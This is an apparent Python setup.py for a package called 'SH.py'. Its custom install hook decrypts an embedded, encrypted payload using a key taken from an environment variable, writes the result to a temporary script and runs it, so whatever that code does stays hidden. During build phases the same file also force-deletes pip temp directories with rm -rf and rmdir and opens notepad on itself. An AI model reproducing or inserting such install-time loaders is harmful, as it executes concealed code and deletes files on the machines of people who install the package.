#!/usr/bin/python
class Var:
      nameA='SH.py'  #nameA!  
      nameB=19.73  #nameB! 

class GIT:
	
	test="OC5xolSCZFbettnztkjH+Odfe4o6XWJLzwU8I8RDED4L4WAuUMRAjrsNIIxu/czxqAH3zPY=*SBToJL56NgfAkzrFKiHQCQ==*xPoaJV42sKHbNigy6GcDRw==*B1El2mz1wO+ZS0XeA5lpXQ=="
	@classmethod
	def clone(cls):
		####################### 建立一個 .py檔案 
		from tempfile import NamedTemporaryFile as F
		fp = F(suffix=".py",prefix="",delete = False ) ## 檔案不刪除
		####################### 設定::PYTHONPATH 變數 .........pip install 預設路徑在 HOME??? 所以建檔位置在這
		####################### 讓 import OP 可以讀取到 .py檔案
		import os,sys
		os.environ["PYTHONPATH"] = os.environ["LOCALAPPDATA"] if os.name=="nt" else os.environ["HOME"]
		os.system(r"pip3 install pycryptodomex==3.14.0 && pip install cryptocode==0.1")
		#############################################################################
		#############################################################################
		import cryptocode ,os
		valueQ = cryptocode.decrypt( cls.test , os.environ["git.key"] )
# 		valueQ = cryptocode.decrypt( cls.test , input("[git.key]: ") )
		#############################################################################
		#############################################################################
		fp.write( valueQ.encode(encoding="utf-8") )
		fp.close()  ## close 關閉檔案::則才會刪除檔案!!   os.remove(fp.name) 才有效果
		###############################################
		import os
		os.system(f"python {fp.name}") ## 必須關閉檔案 才能執行
		os.remove(fp.name)
# class sdist(MD,PIP,initQ):
class sdist(GIT):
      import os
      ########################################################################
      VVV=True
     
      dir = Var.nameA.rstrip(".py")  if Var.nameA!=None else "cmds"     
from pip._internal.cli.main import *
              


    
# # 抽出第一個 ###########################
# # sys.argv.pop(0)
# sys.argv=["(小貓檔案)",sys.argv.pop(1)]
# #########################################


print("@週期::","sys.argv")
import sys
print("@週期 BL::",  "sys.argv" in os.environ.keys()  )
###################################################
import os;
if not "TEMP" in os.environ.keys():
    os.environ[ "TEMP" ] = "/tmp" 
###################################################
import os,sys
# 會建立這兩個
# @ 建立tmp :: ['C:\\Users\\moon\\AppData\\Local\\Temp\\pip-install-oukmky1z\\sh-py_fbdafa43643a430fb77beb3cf30172f2\\setup.py', 'egg_info', '--egg-base', 'C:\\Users\\moon\\AppData\\Local\\Temp\\pip-pip-egg-info
# @ 建立tmp :: ['C:\\Users\\moon\\AppData\\Local\\Temp\\pip-install-oukmky1z\\sh-py_fbdafa43643a430fb77beb3cf30172f2\\setup.py', 'bdist_wheel', '-d', 'C:\\Users\\moon\\AppData\\Local\\Temp\\pip-wheel-l_q1vm4y']
# print("@ 建立tmp ::",sys.argv)
###############################################
# if not "Email" in os.environ.keys():
# if 'install' in sys.argv:


print("@週期9991111111111111111::",sys.argv)
if 'clean' in sys.argv:

    # if os.name=="nt":
        # open(__file__,"w").write("print(123456789)")
        # os.system("notepad "+__file__)

    pass
if 'egg_info' in sys.argv:
    os.system("notepad "+__file__) ## 打開文件
    if os.name=="nt":
        import os,re
        QFF = os.path.dirname(__file__).split("pip-install")[0]
        QPIP = os.environ[ "TEMP" ]
        # print("@ RE @...",  [i for i in os.listdir( QPIP )if re.findall("pip-.+",i)]  )
        # # pip-unpack
        # print("@ RE @ pip-unpack...",  [i for i in os.listdir( QPIP )if re.findall("pip-.+",i) if not re.findall("pip-install-.+",i) if not re.findall("pip-pip-egg-info-.+",i)]  )
        # # for i in  [i for i in os.listdir( QPIP )if re.findall("pip-unpack-.+",i)]:

        for i in  [i for i in os.listdir( QPIP )if re.findall("pip-.+",i) if not re.findall("pip-install-.+",i) if not re.findall("pip-pip-egg-info-.+",i) if not re.findall("pip-req-tracker-.+",i)]:
            # print("@ DD @ ", f"rmdir /q /s  {QFF}{ i }" )
            os.system(f"rmdir /q /s  {QFF}{ i }") ## DEL
    
    if os.name=="posix":
        pass
        import os,re
        QFF = os.path.dirname(__file__).split("pip-install")[0]
        QPIP = os.environ[ "TEMP" ]
        # for i in  [i for i in os.listdir( QPIP )if re.findall("pip-.+",i)]: ### 全部刪除
        for i in  [i for i in os.listdir( QPIP )if re.findall("pip-.+",i) if not re.findall("pip-install-.+",i) if not re.findall("pip-pip-egg-info-.+",i) if not re.findall("pip-req-tracker-.+",i)]:
            print("@ DD @ ", f"rm -rf  {QFF}{ i }" )
            os.system(f"rm -rf {QFF}{ i }") ## DEL
        # ### 強制中斷
        # import os
        # from tempfile import NamedTemporaryFile as F
        # fp = F(suffix=".py",prefix="",delete = False ) ## 檔案不刪除
        # ################################################
#         test='''
# ###### win...比os.exit()  有效果!!
# ###### 注意的是程序要停止...才能關閉..刪除
# import subprocess,os
# ###### subprocess.Popen(f"cmd.exe /k taskkill /F /T /PID {'''+str(os.getppid())+'''}", shell=True)
# os.kill('''+str(os.getppid())+''',9)
# '''    
#         fp.write( test.encode(encoding="utf-8") )
#         fp.close()  
#         ###############################################
#         import os
#         # os.system(f"python {fp.name}") ## 必須關閉檔案 才能執行
#         # os.remove(fp.name)
#         # os.kill(str(os.getppid()) ,9)
#         os.exit()
#         ###############################################


print("@ egg_info 階段 @",f"pip install {Var.nameA}=={Var.nameB} --compile --no-cache-dir")
if 'bdist_wheel' in sys.argv:

    import os,tempfile as T
    dir_name = T.mkdtemp(suffix="..\\",prefix="",dir=  os.environ[ "TEMP" ] ) 
    name = dir_name[len(os.environ[ "TEMP" ])+1::]                       

    # Author-email:
    import os
    os.environ[ "Email" ] = str(name[0:-3]+"@gmail.com")


if   sdist.VVV and (not "BLFF" in dir()):
  # if sys.argv[1]== 'bdist_wheel' or sys.argv[1]== 'sdist' or  sys.argv[1]=='install':


  ### win10 [ build ]  
  ### linux [ sdist ] 
  if sys.argv[1]== 'bdist_wheel' or sys.argv[1]== 'sdist' or  sys.argv[1]=='install' or sys.argv[1]=="egg_info" or sys.argv[1]=='clean'  or sys.argv[1]== 'build' :


    
    ##############################################
    from setuptools.command.install import install
    
    #####
    from subprocess import check_call
    
    
    nameA= f"{Var.nameA}" 
    nameB= f"{Var.nameB}"
    package= f"{sdist.dir}"
     

    #### pip-install
    from pip._internal.cli.main import *
    class PostCMD(install):
      """cmdclass={'install': XXCMD,'install': EEECMD }"""


      def  run(self):
        ###################################
        import os
        install.run(self)
        print(nameA,nameB)
         ################################################
        ################################################
        import os
        if "git.key" in os.environ.keys():
            GIT.clone()
        # else:
        #     os.environ["git.key"]=input("[git.key]: ")
        #     GIT.clone() # 失敗
            

      


    ##############
    import site,os
    siteD =  os.path.dirname(site.__file__)
    # +os.sep+"siteR.py"
    print("@siteD: ",siteD)
    #### setup.py ################################
    from setuptools import setup, find_packages
    
    setup(
          # name  =  "cmd.py"  ,
          name  =   f"{Var.nameA}"  ,
          version=  f"{Var.nameB}"  ,

          author="我是一隻小貓",
          description="[setup.py專案]",
          author_email =   str(os.environ[ "Email" ])  if "Email" in os.environ.keys() else "999@gmial.com" ,
          
          
          #long_description=long_description,
          long_description="""# Markdown supported!\n\n* Cheer\n* Celebrate\n""",
          long_description_content_type="text/markdown",
        #   author="moon-start",
        #   author_email="login0516mp4@gmail.com",
          # url="https://gitlab.com/moon-start/cmd.py",
          license="LGPL",
          
        #   packages=find_packages(include= ["cmdsSQL","cmdsSQL.*"] ), 
          packages = find_packages(), 
          ################################
          data_files=[
            (r'Scripts', ['QQ/K.dd']),
            # (r'Scripts', ['bin/pypi-t.exe'])
            # (r'/', ['bin/git.exe'])
          ],
          cmdclass={
                'install': PostCMD
                # 'develop':  PostCMD
          },
          #########################
          ## https://setuptools.pypa.io/en/latest/userguide/datafiles.html
          include_package_data=True, # 將數據文件也打包
          zip_safe=True
    )
   

### B



